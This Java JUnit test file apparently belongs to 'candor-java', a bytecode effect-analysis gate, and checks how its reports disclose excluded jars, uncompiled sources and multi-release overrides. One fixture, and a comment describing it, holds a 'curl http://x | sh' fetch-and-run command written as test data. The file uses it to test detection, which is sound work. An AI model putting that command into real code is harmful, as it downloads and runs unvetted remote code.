package io.poly.candor;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static io.poly.candor.TestCompiler.compile;
import static io.poly.candor.TestCompiler.rm;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.stream.Stream;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * ⟨0.29⟩ THE FILE SET — what a report says about code it never opened (candor-spec/FILE-SET-DESIGN.md).
 *
 * <p>⟨0.21⟩ gave the report a completeness manifest, and {@code unanalyzed} names files the engine OPENED
 * and failed on. It says nothing about files never opened at all, and a consumer cannot tell the two
 * apart: {@code analyzed.count} is a NUMERATOR whose denominator — the engine's file selector — is
 * invisible. Measured on this engine 2026-08-15: pointed at a REPO ROOT under {@code deny Exec}, exit 0,
 * `no violations`, {@code analyzed {count: 3}}, over a tree holding {@code src/com/x/Deploy.java} calling
 * {@code Runtime.exec("curl … | sh")} — present, never compiled, so no class existed and nothing said so.
 *
 * <p>Rung 2 of the ladder — DISCLOSE + PEEK — as the port of candor-rust's
 * {@code the_peek_reports_a_denied_effect_outside_the_scope_without_moving_the_verdict}.
 *
 * <p><b>THIS ENGINE'S EXCLUSION IS A DIFFERENT KIND, and the rows are shaped by it.</b> The other three
 * arms make a SCOPE decision among files they can read — a build script, a tsconfig program, a SwiftPM
 * target — and the peek reads what they skipped. candor-java reads BYTECODE. A `.java` with no compiled
 * class is not a scope decision and cannot be peeked at all, so it is disclosed with {@code peeked:false}
 * and a nudge; an ARCHIVE under the scan root is the opposite — bytecode this engine reads perfectly well
 * that a `.class`-filtering walk never opens — and that is what the peek reads. Without the
 * {@code peeked} flag, an empty {@code outOfScope} would be certifying a look at files nobody opened,
 * which is ⟨0.26⟩'s partial-manifest failure exactly.
 */
class FileSetScopeTest {

    @TempDir Path tmp;

    private record Run(int exit, String stdout, String stderr) {}

    private static Run runCli(String... args) throws Exception {
        String javaBin = System.getProperty("java.home") + "/bin/java";
        String cp = System.getProperty("java.class.path");
        List<String> cmd = new ArrayList<>(List.of(javaBin, "-cp", cp, "io.poly.candor.Candor"));
        cmd.addAll(List.of(args));
        Process p = new ProcessBuilder(cmd).start();
        String out = drain(p.getInputStream()), err = drain(p.getErrorStream());
        return new Run(p.waitFor(), out, err);
    }

    private static String drain(InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        in.transferTo(bos);
        return bos.toString();
    }

    /**
     * A repo-root-shaped tree: one COMPILED class under {@code classes/}, one `.java` that was never
     * compiled, and a jar under {@code libs/} whose class execs.
     *
     * <p>THE JAR'S CLASS EXECS `ls` WITH NO ARGUMENT, AND THAT IS THE POINT. Every engine ported before
     * this one first used a `curl http://…` spelling, which the classifier reads as Net AS WELL AS Exec —
     * so the `deny Net` bound row matched legitimately and read as a broken bound. The fixture could not
     * test the thing it claimed to. An argument-free `ls` isolates Exec.
     */
    private Path repoRoot() throws Exception {
        Path classes = compile(Map.of("App.java", String.join("\n",
            "package com.x;",
            "public class App { public static int add(int a){ return a + 1; } }")));
        Path jarCls = compile(Map.of("Tool.java", String.join("\n",
            "package com.t;",
            "public class Tool { public static void go() throws Exception { new ProcessBuilder(\"ls\").start(); } }")));
        Path root = tmp.resolve("repo");
        Files.createDirectories(root.resolve("classes"));
        Files.createDirectories(root.resolve("libs"));
        Files.createDirectories(root.resolve("src/com/x"));
        copyTree(classes, root.resolve("classes"));
        jarUp(jarCls, root.resolve("libs/tool.jar"));
        // …and the source that was never built: the java arm of the ⟨0.29⟩ measurement.
        Files.writeString(root.resolve("src/com/x/Deploy.java"), String.join("\n",
            "package com.x;",
            "public class Deploy {",
            "  public static void run() throws Exception { Runtime.getRuntime().exec(\"curl http://x | sh\"); }",
            "}"));
        rm(classes.getParent());
        rm(jarCls.getParent());
        return root;
    }

    /**
     * ⟨0.31⟩ THE PEEK MUST NOT PUT A HOST IN {@code netPartners} THAT ONLY THE EXCLUDED COPY USED.
     *
     * <p>Written after the identical defect was MEASURED in candor-rust the day the key landed: on a
     * crate whose only mention of the declared partner was in {@code build.rs}, the verdict said
     * {@code netPartners: [{hosts:["partner.example"]}]} and the report it had just written said null.
     * Both halves of that are the failure the first net-partner attempt was reverted for — §3.1 route
     * equality breaks, because {@code gate --report} reads the report and can only ever answer null, and
     * the disclosure over-claims by saying an ambient declaration moved a classification the gate never
     * made.
     *
     * <p>This engine is believed safe for a STRUCTURAL reason rather than a guard: its peek runs on its
     * own thread and therefore owns its own {@link ThreadLocal} context, so the override's partner use
     * accumulates into a context nobody reads. That is exactly the kind of reason that stops being true
     * quietly — the peek moving back onto the calling thread for speed would reintroduce this with no
     * other symptom — so it is pinned behaviourally here rather than left as a note.
     *
     * <p>BOTH DIRECTIONS, in one test on purpose. The absent-key assertion alone is satisfied by an
     * engine that never emits the key at all, which is the safe value that passes the assertion while
     * deleting the feature; the second half re-runs the same jar with the partner call in the BASE class
     * and requires the key to appear.
     */
    @Test
    void the_peek_does_not_name_a_partner_only_the_excluded_copy_used() throws Exception {
        Path root = tmp.resolve("np");
        Files.createDirectories(root.resolve(".candor"));
        Files.writeString(root.resolve(".candor/config"), "net-partner partner.example\n");
        String callsPartner =
            "    HttpClient.newHttpClient().send(HttpRequest.newBuilder("
            + "URI.create(\"https://partner.example/v1\")).build(), HttpResponse.BodyHandlers.ofString());";

        // ARM 1 — the partner is reached ONLY from the versioned override, which the gate does not judge.
        Path base = compile(Map.of("B.java", String.join("\n",
            "package com.x;",
            "public class B { public static int f(int i) { return i + 1; } }")));
        Path over = compile(Map.of("B.java", String.join("\n",
            "package com.x;",
            "import java.net.*; import java.net.http.*;",
            "public class B {",
            "  public static int f(int i) throws Exception {",
            callsPartner,
            "    return i;",
            "  }",
            "}")));
        Path tree = root.resolve("mrnp");
        Files.createDirectories(tree.resolve("META-INF/versions/9"));
        copyTree(base, tree);
        copyTree(over, tree.resolve("META-INF/versions/9"));
        Path jar = root.resolve("mrnp.jar");
        jarUp(tree, jar);

        Run r = runCli(jar.toString(), "--json", root.resolve("np.json").toString(),
                       "--policy", policy("npmr.policy", "deny Net\n").toString());
        JsonObject rpt = report(root.resolve("np.json"));

        // THE CONTROL FOR THE SETUP. Without this the arm below passes on a run where the peek never
        // read the override at all, which proves nothing about what it records.
        JsonArray oos = rpt.getAsJsonArray("outOfScope");
        assertNotNull(oos, "the peek reported nothing at all — the base class is pure, so its silence "
            + "means the versioned copy was never read and this test cannot answer its question");
        assertEquals(1, oos.size(), "expected exactly the override's Net: " + oos);
        assertEquals(2, r.exit(), "a peeked fn performing the denied effect makes the verdict INCOMPLETE");

        assertTrue(!rpt.has("netPartners") || rpt.get("netPartners").isJsonNull(),
            "the report names a partner host that only the EXCLUDED copy reached. The gate judged the "
            + "BASE class, which never touches it, so this claims an ambient config moved a "
            + "classification that was never made — and `gate --report` reading this report cannot "
            + "reproduce the scan route's verdict: " + rpt.get("netPartners"));

        // ARM 2 — THE OVER-CHARGE CONTROL. Same jar shape, partner call in the BASE class this time. An
        // engine that simply never emits the key would satisfy arm 1 while shipping nothing.
        Path base2 = compile(Map.of("B.java", String.join("\n",
            "package com.x;",
            "import java.net.*; import java.net.http.*;",
            "public class B {",
            "  public static int f(int i) throws Exception {",
            callsPartner,
            "    return i;",
            "  }",
            "}")));
        Path tree2 = root.resolve("mrnp2");
        Files.createDirectories(tree2);
        copyTree(base2, tree2);
        Path jar2 = root.resolve("mrnp2.jar");
        jarUp(tree2, jar2);
        runCli(jar2.toString(), "--json", root.resolve("np2.json").toString(),
               "--policy", policy("npmr2.policy", "deny Net\n").toString());
        JsonObject rpt2 = report(root.resolve("np2.json"));
        assertTrue(rpt2.has("netPartners") && !rpt2.get("netPartners").isJsonNull(),
            "the partner is reached from the JUDGED class here, so the ambient config demonstrably moved "
            + "this run's classification and §3.1 requires the verdict to name it. Arm 1 above is "
            + "vacuous without this: " + rpt2);
        assertTrue(rpt2.getAsJsonObject("netPartners").get("hosts").toString().contains("partner.example"),
            "…and it must name the host that PARTICIPATED: " + rpt2.get("netPartners"));
    }

    private static void copyTree(Path from, Path to) throws Exception {
        try (Stream<Path> s = Files.walk(from)) {
            for (Path p : (Iterable<Path>) s::iterator) {
                Path dst = to.resolve(from.relativize(p).toString());
                if (Files.isDirectory(p)) Files.createDirectories(dst);
                else { Files.createDirectories(dst.getParent()); Files.copy(p, dst); }
            }
        }
    }

    private static void jarUp(Path classesDir, Path jar) throws Exception {
        Files.createDirectories(jar.getParent());
        try (JarOutputStream out = new JarOutputStream(Files.newOutputStream(jar));
             Stream<Path> s = Files.walk(classesDir)) {
            for (Path p : (Iterable<Path>) s.filter(Files::isRegularFile)::iterator) {
                out.putNextEntry(new JarEntry(classesDir.relativize(p).toString().replace('\\', '/')));
                out.write(Files.readAllBytes(p));
                out.closeEntry();
            }
        }
    }

    private Path policy(String name, String text) throws Exception {
        Path p = tmp.resolve(name);
        Files.writeString(p, text);
        return p;
    }

    private JsonObject report(Path file) throws Exception {
        return JsonParser.parseString(Files.readString(file)).getAsJsonObject();
    }

    private static JsonObject excludedClass(JsonObject rpt, String cls) {
        for (var e : rpt.getAsJsonArray("excluded")) {
            JsonObject o = e.getAsJsonObject();
            if (cls.equals(o.get("class").getAsString())) return o;
        }
        return null;
    }

    /**
     * THE SCOPE. {@code analyzed.count} is a numerator; the selection that produced it appeared nowhere,
     * so a consumer could not tell whether the answer was to the question they asked.
     *
     * <p>Asserts the REASON STRING, not the key's presence: a block whose reasons a consumer cannot read
     * is a count, and a count does not say whether the exclusion matches your question.
     */
    @Test void theReportDeclaresWhatTheScanChoseNotToOpen() throws Exception {
        Path root = repoRoot();
        Path out = tmp.resolve("r.json");
        Run r = runCli(root.toString(), "--json", out.toString());
        assertEquals(0, r.exit(), r.stderr());
        JsonObject rpt = report(out);
        assertNotNull(rpt.get("excluded"), "`excluded` must be present, even when empty (⟨0.27⟩)");

        JsonObject src = excludedClass(rpt, "source-without-class");
        assertNotNull(src, "the uncompiled source must be declared as excluded: " + rpt.get("excluded"));
        assertEquals(1, src.get("count").getAsInt());
        assertFalse(src.get("peeked").getAsBoolean(),
            "…and declared UNPEEKED — this engine reads bytecode, so an empty outOfScope says nothing about it");
        assertTrue(src.get("reason").getAsString().contains("BYTECODE"),
            "the reason must say WHY, not just name the class: " + src.get("reason"));

        JsonObject jar = excludedClass(rpt, "archive-under-the-scan-root");
        assertNotNull(jar, "the jar under the scan root must be declared as excluded: " + rpt.get("excluded"));
        assertEquals(1, jar.get("count").getAsInt());
        // ⟨0.29⟩ `peeked` IS AN OUTCOME. This run configures NO POLICY, so no peek ran and nothing was
        // read — `false` is the honest answer even for the class the peek is willing to read. The row
        // asserted `true` here while the flag was a per-class constant, which is precisely the overclaim
        // the flag exists to prevent: `peeked:true` beside an absent/empty `outOfScope` reads as "I looked
        // and found nothing" about files nobody opened. The TRUE case is asserted in the peek row, where
        // a policy is configured and the read actually happens.
        assertFalse(jar.get("peeked").getAsBoolean(),
            "no policy was configured, so no peek ran and no class may claim to have been read: " + jar);

        // …and the excluded files really are absent from the analyzed set — otherwise the block would be
        // describing an exclusion that did not happen, which is a different and worse kind of wrong.
        String fns = rpt.getAsJsonArray("functions").toString();
        assertFalse(fns.contains("Deploy"), "the uncompiled source was analyzed after all: " + fns);
        assertFalse(fns.contains("com.t.Tool"), "the jar was analyzed after all: " + fns);

        // THE NUDGE. The report carries the fact for a machine; the operator gets told how much of the
        // tree the verdict is NOT about, because "3 classes from 300 sources" is an operator error and
        // not a scope decision this engine gets to make quietly.
        assertTrue(r.stderr().contains("have no compiled class"), r.stderr());
    }

    /**
     * THE PEEK — an effect in a file the gate did not judge is REPORTED, and changes no verdict.
     *
     * <p>Three rows in one, because the bounds ARE the design and each is a way this becomes noise:
     * {@code deny Exec} finds it, {@code deny Net} over the SAME tree says nothing (bounded by the
     * policy), and no policy at all says nothing (policy-scoped). The exit does not move in any of them.
     */
    @Test void thePeekReportsADeniedEffectOutsideTheScopeAndTheVerdictGoesIncomplete() throws Exception {
        Path root = repoRoot();
        Path out = tmp.resolve("a.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("exec.policy", "deny Exec\n").toString());
        JsonObject rpt = report(out);
        JsonArray oos = rpt.getAsJsonArray("outOfScope");
        assertNotNull(oos, "a configured policy must answer, even with []: " + rpt);
        assertEquals(1, oos.size(), "the jar's Exec must be reported: " + oos);
        JsonObject f = oos.get(0).getAsJsonObject();
        assertEquals("com.t.Tool.go", f.get("fn").getAsString());
        assertEquals("archive-under-the-scan-root", f.get("class").getAsString());
        assertEquals("[\"Exec\"]", f.get("effects").toString());
        assertEquals("libs/tool.jar", f.get("path").getAsString(),
            "named scan-root-relative — an absolute path says where the CI checkout was");
        assertTrue(f.get("reason").getAsString().contains("did NOT judge"),
            "the reason must say the gate did not judge it: " + f.get("reason"));
        // ⟨0.29⟩ …and NOW the class may claim to have been read, because it was.
        JsonObject jarCls = excludedClass(rpt, "archive-under-the-scan-root");
        assertNotNull(jarCls, rpt.get("excluded").toString());
        assertTrue(jarCls.get("peeked").getAsBoolean(),
            "the peek read this class on this run, so the flag must say so: " + jarCls);

        // ⟨0.30⟩ THE VERDICT IS INCOMPLETE. ⟨0.29⟩ asserted the opposite here — "a file the gate declined
        // to judge must not decide an exit code" — and ⟨0.30⟩ reverses that half on the measurement that
        // the peek resolves a CONCRETE denied effect rather than uncertainty. The membership half below is
        // UNCHANGED, and is why the code is 2 and not 1: the gate did not judge this unit, so claiming a
        // violation over it would be false in the other direction.
        assertEquals(2, r.exit(), "a peeked fn performing the denied effect makes the verdict incomplete: " + r.stderr());
        assertFalse(rpt.getAsJsonArray("functions").toString().contains("com.t.Tool"),
            "the out-of-scope function must NOT be folded into the report's functions");
        assertTrue(r.stderr().contains("OUTSIDE this scan's scope"),
            "…and it reaches the operator too, above the verdict: " + r.stderr());

        // BOUNDED BY THE POLICY: the same tree under `deny Net` says nothing about an Exec.
        Path netOut = tmp.resolve("b.json");
        Run net = runCli(root.toString(), "--json", netOut.toString(),
                         "--policy", policy("net.policy", "deny Net\n").toString());
        // ⟨0.33⟩ EXIT 2, not 0 — and the point of THIS arm is unchanged. `outOfScope` is still empty
        // (below): the peek is bounded by the policy, so a `deny Net` run says nothing about an Exec.
        // What moved is the VERDICT, for a different reason entirely — this fixture's repo root also
        // holds a JVM source with no compiled class, i.e. code this scan never read. ⟨0.30⟩ suppressed
        // `ok` when the peek FOUND a denied effect; a peek that cannot open a file finds nothing, which
        // is byte-identical to finding it clean, so unread code now makes the verdict INCOMPLETE too.
        assertEquals(2, net.exit(), "the tree holds a source with no compiled class, so `deny Net` "
                + "cannot certify it either: " + net.stderr());
        JsonArray netOos = report(netOut).getAsJsonArray("outOfScope");
        assertNotNull(netOos, "a configured policy still answers — with []");
        assertEquals(0, netOos.size(), "`deny Net` must not report an Exec in an excluded file: " + netOos);

        // POLICY-SCOPED: no policy, no peek, and the key is ABSENT rather than empty — nothing was asked,
        // so an empty list would be a claim (⟨0.26⟩: absence means "this producer cannot answer").
        Path noneOut = tmp.resolve("c.json");
        runCli(root.toString(), "--json", noneOut.toString());
        assertNull(report(noneOut).get("outOfScope"),
            "with no policy the key must be absent, not empty: " + report(noneOut));
    }

    /**
     * A REFUSED POLICY IS NOT AN ANSWER. §3.1's answerability MUST binds every producer that reads the
     * policy, not the gate alone: a policy this engine refuses evaluates nothing, so {@code outOfScope: []}
     * beside the refusal would certify a look that never happened.
     */
    @Test void aPolicyTheGateRefusesLeavesThePeekUnableToAnswer() throws Exception {
        Path root = repoRoot();
        Path out = tmp.resolve("d.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("bad.policy", "deny Zzz\n").toString());
        assertEquals(2, r.exit(), "the policy is refused, unchanged by this rung: " + r.stderr());
        assertNull(report(out).get("outOfScope"),
            "the peek must not certify under a policy nobody honoured: " + report(out));
    }

    /**
     * THE FUNCTION THE GATE ALREADY JUDGED IS NOT AN OUT-OF-SCOPE FINDING. A repo root routinely holds
     * both {@code build/classes} and {@code build/libs/app.jar} — the same code twice — and without this
     * filter the peek would report every effect in the project as unjudged while the gate was judging it.
     * "The gate did not judge this" is a claim, and it is false for any qual already in the analyzed set.
     */
    @Test void anEffectTheGateAlreadyJudgedIsNotReportedAsOutOfScope() throws Exception {
        Path classes = compile(Map.of("App.java", String.join("\n",
            "package com.x;",
            "public class App { public static void go() throws Exception { new ProcessBuilder(\"ls\").start(); } }")));
        Path root = tmp.resolve("dup");
        Files.createDirectories(root.resolve("classes"));
        copyTree(classes, root.resolve("classes"));
        jarUp(classes, root.resolve("libs/app.jar"));   // the SAME code, packaged
        rm(classes.getParent());

        Path out = tmp.resolve("e.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("exec2.policy", "deny Exec\n").toString());
        assertEquals(1, r.exit(), "the gate still fires on the class it DID judge: " + r.stderr());
        assertEquals(0, report(out).getAsJsonArray("outOfScope").size(),
            "the same qual judged by the gate must not also be reported as unjudged: " + report(out).get("outOfScope"));
    }

    /**
     * A DERIVED ARCHIVE IS NOT PEEKED, and this row exists because the alternative was MEASURED. Pointed
     * at its own repo root under {@code deny Net}, this engine's peek reported one genuine finding — the
     * checked-in {@code gradle/wrapper/gradle-wrapper.jar} fetches over the network on every
     * {@code ./gradlew} — beside SIX copies of one gson class, one per fat jar in {@code build/libs}. A
     * build artifact's contents come from the sources the gate is already judging, so charging them again
     * as out-of-scope buys nothing and teaches the reader to scroll past.
     *
     * <p>And the CONTROL for that exemption, in the same row: pointing the scan INTO the build tree makes
     * them ordinary archives again, because the test is on the path RELATIVE to the scan root. Without it
     * this could be a rule that silently exempts whatever the operator most wanted looked at.
     */
    @Test void aDerivedArchiveIsCountedButNotPeeked() throws Exception {
        Path jarCls = compile(Map.of("Tool.java", String.join("\n",
            "package com.t;",
            "public class Tool { public static void go() throws Exception { new ProcessBuilder(\"ls\").start(); } }")));
        Path classes = compile(Map.of("App.java", String.join("\n",
            "package com.x;",
            "public class App { public static int add(int a){ return a + 1; } }")));
        // The compiled classes live INSIDE the build tree too — the ordinary Gradle shape, and the reason
        // the control below can scan `build/` and get a real scan rather than the empty-scan refusal.
        Path root = tmp.resolve("derived");
        Files.createDirectories(root.resolve("build/classes"));
        copyTree(classes, root.resolve("build/classes"));
        jarUp(jarCls, root.resolve("build/libs/app.jar"));
        rm(classes.getParent());
        rm(jarCls.getParent());

        Path out = tmp.resolve("g.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("exec3.policy", "deny Exec\n").toString());
        assertEquals(0, r.exit(), r.stderr());
        JsonObject rpt = report(out);
        JsonObject derived = excludedClass(rpt, "build-output-archive");
        assertNotNull(derived, "a jar under build/ must be its own class: " + rpt.get("excluded"));
        assertFalse(derived.get("peeked").getAsBoolean(), "…and must be declared UNPEEKED: " + derived);
        assertEquals(0, rpt.getAsJsonArray("outOfScope").size(),
            "the derived jar's Exec must not be reported: " + rpt.get("outOfScope"));

        // THE CONTROL: scanned FROM inside the build tree, the same jar has no `build` segment relative to
        // the root and is peeked like any other — the exemption is about where you pointed the scan.
        Path inner = tmp.resolve("h.json");
        Run r2 = runCli(root.resolve("build").toString(), "--json", inner.toString(),
                        "--policy", policy("exec4.policy", "deny Exec\n").toString());
        // ⟨0.30⟩ …and because it IS peeked here and DOES perform the denied effect, the verdict goes
        // incomplete — the exact contrast this test draws, now visible in the exit code: the arm above
        // stays 0 precisely because that jar was never peeked, so nothing was found to be incomplete about.
        assertEquals(2, r2.exit(), r2.stderr());
        assertEquals(1, report(inner).getAsJsonArray("outOfScope").size(),
            "scanned from inside build/, it is an ordinary archive: " + report(inner).get("outOfScope"));
    }

    /**
     * THE CONTROL, and it is the row that matters most: a scan with nothing to exclude must still EMIT the
     * key, as an empty list — ⟨0.27⟩'s zero-match rule, and ⟨0.26⟩'s reading that an absent key means
     * "this producer cannot answer". Without it the rows above pass against an engine that declares
     * exclusions it invented, or one that fails everything.
     */
    @Test void aScanWithNothingExcludedStillDeclaresAnEmptyScope() throws Exception {
        Path app = compile(Map.of("A.java", String.join("\n",
            "package app;",
            "public class A { public int pure(int x){ return x + 1; } }")));
        try {
            Path out = tmp.resolve("f.json");
            Run r = runCli(app.toString(), "--json", out.toString());
            assertEquals(0, r.exit(), r.stderr());
            JsonArray ex = report(out).getAsJsonArray("excluded");
            assertNotNull(ex, "the key must be emitted even with nothing to say");
            assertEquals(0, ex.size(), "nothing was excluded, so the list must be empty: " + ex);
        } finally {
            rm(app.getParent());
        }
    }

    /**
     * ⟨0.30⟩ THE PEEK READS MULTI-RELEASE OVERRIDES, AND A DENIED EFFECT IN ONE MOVES THE VERDICT.
     *
     * <p>A multi-release jar ships version-specific overrides under {@code META-INF/versions/<N>/}. The
     * scan analyses the BASE class — the portable surface — and skips the override, so an effect present
     * ONLY in a versioned copy sat outside every verdict. That exclusion declared itself
     * {@code peeked: false} and said exactly this in its own reason: an honest hole, and one this engine
     * can close, because an override IS bytecode and {@code load()} already reads it.
     *
     * <p><b>MEASURED BEFORE THE PASS EXISTED, on log4j-api 2.23.1</b> (4 real class overrides, not just a
     * {@code module-info}): scanning the base copies against base-with-overrides-applied — what any JVM 9+
     * actually runs — gave <b>21 functions a materially different verdict</b> and left <b>5 that exist
     * only in the versioned copy</b> unjudged. On that jar the divergence is over-statement, so it is not
     * itself a cardinal sin; the MECHANISM is symmetric, and this fixture is the other direction: a base
     * class that is pure and an override that Execs.
     *
     * <p><b>THE CONTROL IS THE SECOND ARM.</b> A jar whose override is CLEAN must stay exit 0 with an
     * empty out-of-scope block and {@code peeked: true} — the ⟨0.27⟩ asked-and-clear answer. Without it a
     * pass that reddened every multi-release jar would satisfy the first arm, and nearly every modern
     * dependency ships one.
     */
    @Test void aDeniedEffectInAMultiReleaseOverrideIsPeekedAndMovesTheVerdict() throws Exception {
        Path base = compile(Map.of("B.java", String.join("\n",
            "package com.x;",
            "public class B { public static int f(int i) { return i + 1; } }")));
        Path over = compile(Map.of("B.java", String.join("\n",
            "package com.x;",
            "public class B {",
            "  public static int f(int i) throws Exception { new ProcessBuilder(\"ls\").start(); return i; }",
            "}")));
        Path tree = tmp.resolve("mr");
        Files.createDirectories(tree.resolve("META-INF/versions/9"));
        copyTree(base, tree);
        copyTree(over, tree.resolve("META-INF/versions/9"));
        Path jar = tmp.resolve("mr.jar");
        jarUp(tree, jar);

        Run r = runCli(jar.toString(), "--json", tmp.resolve("mr.json").toString(),
                       "--policy", policy("mrexec.policy", "deny Exec\n").toString());
        JsonObject rpt = report(tmp.resolve("mr.json"));
        var oos = rpt.getAsJsonArray("outOfScope");
        assertEquals(1, oos.size(),
            "the override's Exec was not reported — the BASE class is pure, so nothing else in this jar "
            + "could produce a finding, and its absence means the versioned copy was never read: " + oos);
        assertEquals("multi-release-override", oos.get(0).getAsJsonObject().get("class").getAsString(),
            "the finding must be filed under the class that excluded it: " + oos);
        assertEquals(2, r.exit(),
            "a peeked fn performing the denied effect makes the verdict INCOMPLETE. Exit 0 here is the "
            + "false all-clear this pass exists to close: the base is pure and the code that RUNS execs. "
            + r.stderr());
        JsonObject cls = excludedClass(rpt, "multi-release-override");
        assertNotNull(cls, "the class must still be declared in the scope block: " + rpt.get("excluded"));
        assertTrue(cls.get("peeked").getAsBoolean(),
            "…and now declared PEEKED, because every override was read on this run: " + cls);

        // THE CONTROL: same shape, clean override. A pass that reddened every multi-release jar would
        // satisfy the arm above, and nearly every modern dependency ships one.
        Path overClean = compile(Map.of("B.java", String.join("\n",
            "package com.x;",
            "public class B { public static int f(int i) { return i + 2; } }")));
        Path tree2 = tmp.resolve("mr2");
        Files.createDirectories(tree2.resolve("META-INF/versions/9"));
        copyTree(base, tree2);
        copyTree(overClean, tree2.resolve("META-INF/versions/9"));
        Path jar2 = tmp.resolve("mr2.jar");
        jarUp(tree2, jar2);
        Run r2 = runCli(jar2.toString(), "--json", tmp.resolve("mr2.json").toString(),
                        "--policy", policy("mrexec2.policy", "deny Exec\n").toString());
        JsonObject rpt2 = report(tmp.resolve("mr2.json"));
        assertEquals(0, rpt2.getAsJsonArray("outOfScope").size(),
            "a CLEAN override produced a finding: " + rpt2.get("outOfScope"));
        assertEquals(0, r2.exit(), "…and must leave the verdict alone: " + r2.stderr());
        assertTrue(excludedClass(rpt2, "multi-release-override").get("peeked").getAsBoolean(),
            "present-and-empty is asked-and-clear, and it is a claim only if the class was READ");
    }
}
